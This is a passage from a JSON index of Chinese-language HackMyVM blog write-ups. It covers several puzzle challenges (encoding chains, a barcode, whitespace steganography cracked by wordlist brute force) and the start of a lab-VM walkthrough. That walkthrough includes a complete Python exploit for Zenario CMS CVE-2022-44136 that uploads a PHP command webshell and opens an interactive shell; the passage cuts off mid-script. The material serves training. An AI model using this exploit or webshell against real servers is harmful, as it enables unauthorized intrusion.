\u5b66\u673a\u5e8a\u7684\u5e94\u8be5\u5f88\u719f\uff0c\u54c8\u54c8\u54c8\n\nhttps://ncviewer.com/\n\n![image-20250718215438894](https://7r1umphk.github.io/image/20250718215439411.webp)\n\n```\nHMV{engraving_a_trophy_for_Kerszi}\n```\n\nsentence", "top": 0, "createdAt": 1752850634, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-18", "dateLabelColor": "#0969da"}, "P146": {"htmlDir": "docs/post/Challenge 061.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 061", "postUrl": "post/Challenge%20061.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/146", "commentNum": 0, "wordCount": 4519, "description": "![image-20250718215535991](https://7r1umphk.github.io/image/20250718215536221.webp)\n\nhttps://hackmyvm.eu/challenges/challenge.php?c=061\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -la 061.zip \n-rwxr-xr-x 1 kali kali 435  7\u670818\u65e5 09:55 061.zip\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 06*.zip\n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 435 bytes (1 KiB)\n\nExtracting archive: 061.zip\n--\nPath = 061.zip\nType = zip\nPhysical Size = 435\n\nEverything is Ok\n\nSize:       430\nCompressed: 435\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al        \n\u603b\u8ba1 13\ndrwxr-xr-x 1 kali kali 4096  7\u670818\u65e5 09:56 .\ndrwxr-xr-x 1 kali kali 8192  7\u670817\u65e5 23:37 ..\n-rwxr-xr-x 1 kali kali  430 2024\u5e74 1\u670824\u65e5 061.txt\n-rwxr-xr-x 1 kali kali  435  7\u670818\u65e5 09:55 061.zip\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat 061.txt\nUEsDBC0AAgAIALySN1jMnd4u//////////8BABQALQEAEAA4BQAAAAAAAHgAAAAAAAAArVPJDcAg\nDFvJ3n+58mih5G6KhGQBVi7HAAmMsyEWciAh/ieP877xnnfIeBmfimfW4cZf/2HdL4z7S3hZXlUn\na3Og5v+KW9XXzY/ePGW8sp7s7Ve1Dq+vbG9P6WDse+yH4vwMf7byez5HU192dT3kl89+pdvfzb8A\nUEsBAh4DLQACAAgAvJI3WMyd3i54AAAAOAUAAAEAAAAAAAAAAQAAAIARAAAAAC1QSwYGLAAAAAAA\nAAAeAy0AAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAALwAAAAAAAACrAAAAAAAAAFBLBgcAAAAA2gAA\nAAAAAAABAAAAUEsFBgAAAAABAAEALwAAAKsAAAAAAA==\n                                    \n```\n\nhttps://gchq.github.io/CyberChef/\n\n![image-20250718215743580](https://7r1umphk.github.io/image/20250718215743873.webp)\n\nPKZIP\u538b\u7f29\u6587\u4ef6\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 061b.zip -oa           \n\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -la a      \n\u603b\u8ba1 6\n-rwxr-xr-x 1 kali kali 1336 2024\u5e74 1\u670823\u65e5 -\ndrwxr-xr-x 1 kali kali    0  7\u670818\u65e5 10:01 .\ndrwxr-xr-x 1 kali kali 4096  7\u670818\u65e5 10:01 ..\n```\n\n\u795e\u4eba\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat a/-                   \n0011001000110010001100000011000001110100001100100011001000110001001100100111010000110001001100000011000000110001001100100111010000110001001100010011000100110010001100000111010000110001001100000011000000110000001100010111010000110010001100100011001000110010011101000011001000110010001100000011001001110100001100100011000000110000001100010111010000110001001100000011000100110001001100100111010000110001001100100011000100110001011101000011000100110000001100010011000100110010011101000011001000110010001100000011000001110100001100010011001000110001001100000111010000110010001100100011001000110010011101000011000100110010001100100011000001110100001100010011000000110001001100010011001001110100001100010011000000110000001100100011001001110100001100010011001000110001001100000111010000110001001100000011000000110001001100010111010000110001001100000011000100110001001100100111010000110010001100010011000100110001011101000011000100110001001100000011001000110000011101000011000100110010001100100011000101110100001100100011000100110001001100010111010000110010001100100011000100110000011101000011000100110010001100100011000001110100001100100011000100110001001100100111010000110001001100000011000100110001001100100111010000110001001100100011000100110001011101000011001000110000001100000011000101110100001100010011000100110001001100100011001001110100                                                         \n```\n\n![image-20250718220535012](https://7r1umphk.github.io/image/20250718220535314.webp)\n\n\u89e3\u51fa\u4e00\u4e2a\u4e09\u8fdb\u5236\uff0ct\u4e3a\u5206\u9694\u7b26\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat a.py \ns = '2200t2212t10012t11120t10001t2222t2202t2001t10112t1211t10112t2200t1210t2222t1220t10112t10022t1210t10011t10112t2111t11020t1221t2111t2210t1220t2112t10112t1211t2001t11122t'\nnums = s.strip('t').split('t')\nflag = ''.join(chr(int(n, 3)) for n in nums)\nprint(flag)\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 $_               \nHMV{RPJ7_1_H0P3_Y0U_Cr4CK3D_17}\n                          \n```\n\nsentence", "top": 0, "createdAt": 1752850646, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-18", "dateLabelColor": "#0969da"}, "P147": {"htmlDir": "docs/post/Challenge 062.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 062", "postUrl": "post/Challenge%20062.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/147", "commentNum": 0, "wordCount": 1591, "description": "![image-20250718220920924](https://7r1umphk.github.io/image/20250718220921171.webp)\n\nhttps://hackmyvm.eu/challenges/challenge.php?c=062\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -la 062.zip \n-rwxr-xr-x 1 kali kali 2375882  7\u670818\u65e5 10:10 062.zip\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 062.zip     \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 2375882 bytes (2321 KiB)\n\nExtracting archive: 062.zip\n--\nPath = 062.zip\nType = zip\nPhysical Size = 2375882\n\nEverything is Ok\n\nSize:       2377257\nCompressed: 2375882\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -la        \n\u603b\u8ba1 4655\ndrwxr-xr-x 1 kali kali    4096  7\u670818\u65e5 10:10 .\ndrwxr-xr-x 1 kali kali    8192  7\u670817\u65e5 23:37 ..\n-rwxr-xr-x 1 kali kali 2377257 2023\u5e74 1\u670810\u65e5 062.png\n-rwxr-xr-x 1 kali kali 2375882  7\u670818\u65e5 10:10 062.zip\n                                     \n```\n\n![image-20250718221100328](https://7r1umphk.github.io/image/20250718221101047.webp)\n\n\u73b0\u5728\u770b\u5230\u98de\u673a\u5c31\u70e6\uff0c\u4e4b\u524d\u89e3\u90a3\u4e2a\u673a\u573a\u90a3\u4e2a\u5230\u73b0\u5728\u90fd\u6ca1\u641e\u660e\u767d\n\n\u770b\u5230\u6709\u4e00\u4e2a\u6761\u7801\u8fd8\u662f\u5b8c\u6574\u7684\uff0c\u627e\u4e2a\u6761\u7801\u626b\u63cf\uff0c\u626b\u626b\n\nhttps://www.1txm.com/barcodeDecode\n\n![image-20250718221717097](https://7r1umphk.github.io/image/20250718221717466.webp)\n\n```\nHMV{1_l0v3_c0d3_128}\n```\n\nsentence", "top": 0, "createdAt": 1752850656, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-18", "dateLabelColor": "#0969da"}, "P148": {"htmlDir": "docs/post/Challenge 063.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 063", "postUrl": "post/Challenge%20063.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/148", "commentNum": 0, "wordCount": 5552, "description": "![image-20250718221751985](https://7r1umphk.github.io/image/20250718221752208.webp)\n\nhttps://hackmyvm.eu/challenges/challenge.php?c=063\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -la        \n\u603b\u8ba1 4655\ndrwxr-xr-x 1 kali kali    4096  7\u670818\u65e5 10:10 .\ndrwxr-xr-x 1 kali kali    8192  7\u670817\u65e5 23:37 ..\n-rwxr-xr-x 1 kali kali 2377257 2023\u5e74 1\u670810\u65e5 062.png\n-rwxr-xr-x 1 kali kali 2375882  7\u670818\u65e5 10:10 062.zip\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al 063.zip \n-rwxr-xr-x 1 kali kali 431  7\u670818\u65e5 10:18 063.zip\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 063.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 431 bytes (1 KiB)\n\nExtracting archive: 063.zip\n--\nPath = 063.zip\nType = zip\nPhysical Size = 431\n\nEverything is Ok\n\nSize:       671\nCompressed: 431\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al        \n\u603b\u8ba1 14\ndrwxr-xr-x 1 kali kali 4096  7\u670818\u65e5 10:18 .\ndrwxr-xr-x 1 kali kali 8192  7\u670817\u65e5 23:37 ..\n-rwxr-xr-x 1 kali kali  671 2024\u5e74 1\u670824\u65e5 063.txt\n-rwxr-xr-x 1 kali kali  431  7\u670818\u65e5 10:18 063.zip\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat 063.txt\nIn the script's silent dance, spaces weave,                              \nA hidden language, easy to deceive.                                          \nBetween the lines, where eyes might stray,                            \nThe secret dwells in whitespace's play.                                \n                                                                           \nEmbrace the gaps, where silence gleams,                                    \nDecode the whispers in code's dreams.                                    \nIn every blank, a story told,                                              \nFor beginners bold, a mystery unfolds.                                      \n                                                                            \n                                                                           \n                                                                            \n           \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat -A 063.txt \nIn the script's silent dance, spaces weave,^I   ^I  ^I       ^I $\nA hidden language, easy to deceive.       ^I     ^I   ^I  ^I     $\nBetween the lines, where eyes might stray, ^I      ^I ^I      $\nThe secret dwells in whitespace's play.^I       ^I     ^I     ^I       $\n^I    ^I   ^I^I      ^I  ^I  ^I       ^I ^I   $\nEmbrace the gaps, where silence gleams, ^I   ^I ^I      ^I   $\nDecode the whispers in code's dreams. ^I  ^I      ^I  ^I       ^I $\nIn every blank, a story told, ^I  ^I     ^I   ^I ^I       ^I   $\nFor beginners bold, a mystery unfolds.   ^I     ^I  ^I  ^I    $\n       ^I       ^I    ^I    ^I     ^I     ^I  ^I   ^I     ^I    $\n  ^I      ^I^I      ^I ^I^I   ^I ^I   ^I   $\n^I       ^I  ^I  ^I    ^I    ^I     ^I    ^I     ^I    $\n  ^I   $\n                            \n```\n\n\u5bf9\u7a7a\u767d\u6bd4\u8f83\u654f\u611f\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ stegsnow 063.txt \n\ufffd\ufffdr\ufffd\ufffd=\ufffd^i\ufffd\ufffd5\ufffdWO\ufffdH\ufffdM\ufffdR\ufffdpi\ufffd\ufffdM+                                                                                                                                                                               \n```\n\n\u770b\u6837\u5b50\u6709\u52a0\u5bc6\uff0c\u53bb\u6252\u62c9\u4e00\u4e2a\u7206\u7834\nhttps://github.com/cyberpoul/StegsnowBruteForcer\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$git clone https://github.com/cyberpoul/StegsnowBruteForcer.git\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cd StegsnowBruteForcer\n                                                                                       \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/StegsnowBruteForcer]\n\u2514\u2500$ source ~/pythonvenv/bin/activate\n                             \n\u250c\u2500\u2500(pythonvenv)\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/StegsnowBruteForcer]\n\u2514\u2500$ pip install -r requirements.txt\n\n\u250c\u2500\u2500(pythonvenv)\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/StegsnowBruteForcer]\n\u2514\u2500$ python stegsnowbruteforcer.py --file ../063.txt --wordlist /usr/share/wordlists/rockyou.txt --keyword HMV{ --output results.txt \n\n***********************************************************\n*                                                         *\n*         Stegsnow Password Brute-Force Attack            *\n*                    made by Assa                         *\n*     https://github.com/Assa228/StegsnowBruteForcer      *\n*                                                         *\n***********************************************************\n\n  0%|                                | 480/14344392 [00:12<23:06:27, 172.43it/s]\nKeyword 'HMV{' found with the password: letmein\nHere is the decoded message:\nHMV{wh1t3_sp4c3_st3g_15_fu/\\/}\n  0%|                               | 6394/14344392 [00:19<12:25:36, 320.50it/s]^C\n\n```\n\nsentence", "top": 0, "createdAt": 1752850668, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-18", "dateLabelColor": "#0969da"}, "P149": {"htmlDir": "docs/post/nei-bu-_Rabb1t.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Rabb1t", "postUrl": "post/nei-bu-_Rabb1t.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/149", "commentNum": 0, "wordCount": 10753, "description": "![image-20250719210601338](https://7r1UMPHK.github.io/image/20250719210613707.webp)\n\n\u8fd9\u9776\u673a\u540d\u5b57\u8d77\u7684\u597d\uff0c\u54c8\u54c8\u54c8\n\n# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\u4e0e\u670d\u52a1\u63a2\u6d4b\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u4f7f\u7528 `arp-scan` \u5728\u672c\u5730\u7f51\u7edc\u4e2d\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l                     \n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.198 08:00:27:f1:94:b8       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.\n...\n```\n\n\u626b\u63cf\u7ed3\u679c\u786e\u8ba4\u76ee\u6807\u9776\u673a\u7684 IP \u5730\u5740\u4e3a **`192.168.205.198`**\u3002\n\n## 2. \u7aef\u53e3\u626b\u63cf\u4e0e\u52a8\u6001\u7aef\u53e3\u5206\u6790\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.198\n...\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n1028/tcp open  unknown\n...\n```\n\n\u591a\u6b21\u626b\u63cf\u53d1\u73b0\uff0c\u9664\u4e86\u56fa\u5b9a\u7684 22 \u548c 80 \u7aef\u53e3\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u7aef\u53e3\u53f7\u5728 1024 \u4ee5\u4e0a\u7684\u7aef\u53e3\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u6bcf\u6b21\u626b\u63cf\u540e\u7aef\u53e3\u53f7\u4f1a\u589e\u52a02\uff0c\u4e14\u6709\u5927\u7ea610\u79d2\u7684\u5f00\u653e\u95f4\u9694\u3002\u8fd9\u662f\u4e00\u4e2a\u52a8\u6001\u670d\u52a1\u7684\u8ff9\u8c61\u3002\n\n\u4e3a\u4e86\u7a33\u5b9a\u5730\u8bbf\u95ee\u8fd9\u4e2a\u52a8\u6001\u7aef\u53e3\uff0c\u7f16\u5199\u4e86\u4e00\u4e2a bash \u811a\u672c\uff0c\u8be5\u811a\u672c\u80fd\u81ea\u52a8\u53d1\u73b0\u5f53\u524d\u5f00\u653e\u7684\u7aef\u53e3\uff0c\u5e76\u4f7f\u7528 `socat` \u5c06\u5176\u6d41\u91cf\u8f6c\u53d1\u5230\u672c\u5730\u7684\u4e00\u4e2a\u56fa\u5b9a\u7aef\u53e3\u3002\n\n### **\u7aef\u53e3\u8f6c\u53d1\u811a\u672c (`a.sh`)**\n\n```\n#!/bin/bash\n\nIP=$1\nLP=8000\nPP=1028\nPF=/tmp/socat.pid\n\ng(){\n  while :;do\n    (echo > /dev/tcp/$IP/$PP) 2>/dev/null && break || PP=$((PP+2))\n    [ $PP -gt 65535 ] && PP=1030\n  done\n}\n\n[ -f $PF ] && kill $(cat $PF) 2>/dev/null && rm $PF\n\ng\nsocat TCP-LISTEN:$LP,fork,reuseaddr TCP:$IP:$PP &\necho $! > $PF\n\nwhile :;do\n  (echo > /dev/tcp/$IP/$PP) 2>/dev/null || {\n    kill $(cat $PF); rm $PF\n    PP=$((PP+2))\n    [ $PP -gt 65535 ] && PP=1030\n    g\n    socat TCP-LISTEN:$LP,fork,reuseaddr TCP:$IP:$PP &\n    echo $! > $PF\n  }\n  sleep 1\ndone\n```\n\n\u8fd0\u884c\u6b64\u811a\u672c\u540e\uff0c\u52a8\u6001\u7aef\u53e3\u7684\u670d\u52a1\u88ab\u6210\u529f\u8f6c\u53d1\u5230\u672c\u5730\u7684 `8000` \u7aef\u53e3\u3002\n\n# \u4e8c\u3001Web\u5e94\u7528\u6e17\u900f\u4e0e\u6f0f\u6d1e\u5229\u7528\n\n## 1. \u76ee\u5f55\u626b\u63cf\u4e0e\u4fe1\u606f\u6cc4\u9732\n\n\u901a\u8fc7\u672c\u5730 `8000` \u7aef\u53e3\u5bf9\u8f6c\u53d1\u7684\u670d\u52a1\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\u3002\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ffuf -u 'http://192.168.205.128:8000/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --fl 15 -e .php,.txt,.html,.zip\n...\npassword.txt            [Status: 200, Size: 74, Words: 11, Lines: 4, Duration: 9ms]\nrobots.txt              [Status: 200, Size: 251, Words: 12, Lines: 12, Duration: 214ms]\n...\n```\n\n\u626b\u63cf\u53d1\u73b0\u4e86 `robots.txt` \u6587\u4ef6\uff0c\u5176\u5185\u5bb9\u6cc4\u9732\u4e86\u591a\u4e2a\u540e\u53f0\u76ee\u5f55\uff0c\u5176\u4e2d\u6700\u5173\u952e\u7684\u662f `zenario`\u3002\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl http://192.168.205.128:8000/robots.txt\nUser-agent: *\nDisallow: /admin/\n...\nDisallow: /zenario/\n...\n```\n\n\u8bbf\u95ee\u8be5 Web \u670d\u52a1\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u5176\u4f7f\u7528\u4e86 **Zenario CMS**\uff0c\u7248\u672c\u53f7\u4e3a `9.3.57186`\u3002\n\n## 2. Zenario CMS \u6f0f\u6d1e\u5229\u7528\n\n\u901a\u8fc7\u641c\u7d22\u516c\u5f00\u6f0f\u6d1e\u5e93\uff0c\u53d1\u73b0 Zenario CMS 9.3 \u7248\u672c\u5b58\u5728\u4e00\u4e2a\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e **(CVE-2022-44136)**\u3002\u6839\u636e\u516c\u5f00\u7684 PoC\uff0c\u6211\u4eec\u7f16\u5199\u4e86\u4e00\u4e2a\u5229\u7528\u811a\u672c (`exp.py`) \u6765\u4e0a\u4f20\u4e00\u4e2a webshell\u3002\n\n> [!Tip]\n>\n> https://com0t.github.io/zenar.io/2022/10/18/Unauthent-RCE-Zenar.io~9.3.html\n\n### \u5229\u7528\u811a\u672cexp.py\n\n```\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# Exploit Title: Zenario CMS 9.3 - Unauthenticated Remote Code Execution (RCE)\n# CVE: CVE-2022-44136\n# Author: Gemini (based on provided request analysis)\n# Date: 2025-07-19\n# Description: This script exploits an unrestricted file upload vulnerability in\n# Zenario CMS 9.3. The vulnerability is triggered by a typo in the Content-Type\n# header (`Content-Tyope`) which bypasses the file type validation, allowing\n# the upload of a PHP webshell.\n\nimport requests\nimport argparse\nimport sys\nimport json\nfrom urllib.parse import urljoin\n\n# \u5173\u95edrequests\u5e93\u56e0\u8bc1\u4e66\u9a8c\u8bc1\u5931\u8d25\u800c\u4ea7\u751f\u7684\u8b66\u544a\nrequests.packages.urllib3.disable_warnings()\n\ndef print_banner():\n    '''\u6253\u5370\u4e00\u4e2a\u6f02\u4eae\u7684\u6a2a\u5e45'''\n    print('=' * 60)\n    print(' Zenario CMS 9.3 Unauthenticated RCE Exploit (CVE-2022-44136)')\n    print('=' * 60)\n\ndef exploit(target_url, instance_id, filename):\n    '''\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u7684\u6838\u5fc3\u51fd\u6570'''\n    \n    endpoint = '/zenario/ajax.php'\n    upload_url = urljoin(target_url, endpoint)\n\n    # Webshell\u7684\u5185\u5bb9\n    webshell_content = b'<?php echo '>>>'; system($_GET['cmd']); echo '<<<'; ?>'\n\n    # URL\u67e5\u8be2\u53c2\u6570\uff0c\u4e0e\u622a\u56fe\u4e2d\u4fdd\u6301\u4e00\u81f4\n    params = {\n        'method_call': 'handlePluginAJAX',\n        'cID': '1',\n        'slideId': '0',\n        'cType': 'html',\n        'instanceId': instance_id,\n        'fileUpload': ''\n    }\n\n    # \u8fd9\u662f\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u3002\u6211\u4eec\u5148\u6b63\u5e38\u5b9a\u4e49\u5b83\u3002\n    # ('fileUpload', (filename, webshell_content, 'image/jpeg'))\n    #  ^--\u8868\u5355\u5b57\u6bb5\u540d      ^--\u6587\u4ef6\u540d   ^--\u6587\u4ef6\u5185\u5bb9      ^--\u4e00\u4e2a\u65e0\u5bb3\u7684Content-Type\n    files = {\n        'fileUpload': (filename, webshell_content, 'image/jpeg')\n    }\n\n    print(f'[*] \u51c6\u5907\u5411 {upload_url} \u4e0a\u4f20webshell...')\n    print(f'[*] \u4f7f\u7528 Instance ID: {instance_id}')\n    print(f'[*] \u4e0a\u4f20\u6587\u4ef6\u540d: {filename}')\n\n    # --- \u5173\u952e\u7684\u7ed5\u8fc7\u6b65\u9aa4 ---\n    # 1. \u4f7f\u7528requests\u5e93\u51c6\u5907\u4e00\u4e2a\u8bf7\u6c42\u5bf9\u8c61\uff0c\u4f46\u5148\u4e0d\u53d1\u9001\n    session = requests.Session()\n    req = requests.Request('POST', upload_url, params=params, files=files)\n    prepared_req = req.prepare()\n\n    # 2. prepared_req.body\u662fbytes\u7c7b\u578b\uff0c\u5305\u542b\u4e86\u6574\u4e2amultipart/form-data\u7684\u5185\u5bb9\n    #    \u6211\u4eec\u5c06\u5176\u89e3\u7801\u4e3a\u5b57\u7b26\u4e32\uff0c\u8fdb\u884c\u66ff\u6362\u64cd\u4f5c\uff0c\u7136\u540e\u518d\u7f16\u7801\u56de\u53bb\n    body_str = prepared_req.body.decode('utf-8', errors='ignore')\n\n    # 3. \u5c06 'Content-Type' \u66ff\u6362\u4e3a 'Content-Tyope'\uff0c\u8fd9\u662f\u6f0f\u6d1e\u7684\u6838\u5fc3\n    modified_body_str = body_str.replace('Content-Type: image/jpeg', 'Content-Tyope: image/svg+xml')\n    prepared_req.body = modified_body_str.encode('utf-8')\n    \n    # 4. \u66f4\u65b0Content-Length\u5934\uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u4fee\u6539\u53ef\u80fd\u5bfc\u81f4\u957f\u5ea6\u53d8\u5316\uff08\u5c3d\u7ba1\u8fd9\u91cc\u6ca1\u6709\uff09\n    prepared_req.headers['Content-Length'] = str(len(prepared_req.body))\n\n    print('[+] \u8bf7\u6c42\u5df2\u88ab\u4fee\u6539\uff0c\u6ce8\u5165 'Content-Tyope' \u7ed5\u8fc7\u4ee3\u7801\u3002')\n    print('[*] \u6b63\u5728\u53d1\u9001\u6076\u610f\u8bf7\u6c42...')\n\n    try:\n        # 5. \u53d1\u9001\u6211\u4eec\u624b\u52a8\u4fee\u6539\u8fc7\u7684\u8bf7\u6c42\n        response = session.send(prepared_req, verify=False, timeout=15)\n\n        # \u68c0\u67e5\u54cd\u5e94\u662f\u5426\u6210\u529f\n        if response.status_code == 200:\n            print('[+] \u670d\u52a1\u5668\u8fd4\u56de 200 OK\uff0c\u53ef\u80fd\u4e0a\u4f20\u6210\u529f\uff01')\n            try:\n                # \u89e3\u6790\u670d\u52a1\u5668\u8fd4\u56de\u7684JSON\n                response_json = response.json()\n                file_path = response_json['files'][0]['path']\n                \n                # \u6784\u5efa\u5b8c\u6574\u7684webshell URL\n                webshell_url = urljoin(target_url, f'{file_path}')\n                print('\\n' + '='*60)\n                print(f'[\\033[1;32mSUCCESS\\033[0m] Webshell\u4e0a\u4f20\u6210\u529f!')\n                print(f'[\\033[1;32mURL\\033[0m]: {webshell_url}')\n                print('='*60 + '\\n')\n                return webshell_url\n            except (json.JSONDecodeError, KeyError, IndexError):\n                print('[-] \u4e0a\u4f20\u6210\u529f\uff0c\u4f46\u65e0\u6cd5\u4ece\u54cd\u5e94\u4e2d\u89e3\u6790\u6587\u4ef6\u8def\u5f84\u3002')\n                print('[-] \u54cd\u5e94\u5185\u5bb9: ', response.text)\n                return None\n        else:\n            print(f'[-] \u4e0a\u4f20\u5931\u8d25\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u72b6\u6001\u7801: {response.status_code}')\n            return None\n\n    except requests.exceptions.RequestException as e:\n        print(f'[-] \u8bf7\u6c42\u53d1\u751f\u9519\u8bef: {e}')\n        return None\n\ndef interactive_shell(webshell_url):\n    '''\u63d0\u4f9b\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684\u547d\u4ee4\u6267\u884c\u73af\u5883'''\n    print('[*] \u542f\u52a8\u4ea4\u4e92\u5f0fWebshell... (\u8f93\u5165 'exit' \u9000\u51fa)')\n    session = requests.Session()\n    try:\n        while True:\n            cmd = input('\\033[1;34mcmd > \\033[0m')\n            if cmd.lower() in ['exit', 'quit']:\n                break\n            \n            # \u53d1\u9001GET\u8bf7\u6c42\u6765\u6267\u884c\u547d\u4ee4\n            params = {'cmd': cmd}\n            try:\n                response = session.get(webshell_url, params=params, verify=False, timeout=10)\n                # \u63d0\u53d6\u7531 '>>>' \u548c '<<<' \u5305\u88f9\u7684\u547d\u4ee4\u8f93\u51fa\n                output = response.text.split('>>>')[1].split('<<<')[0]\n                print(output)\n            except requests.exceptions.RequestException as 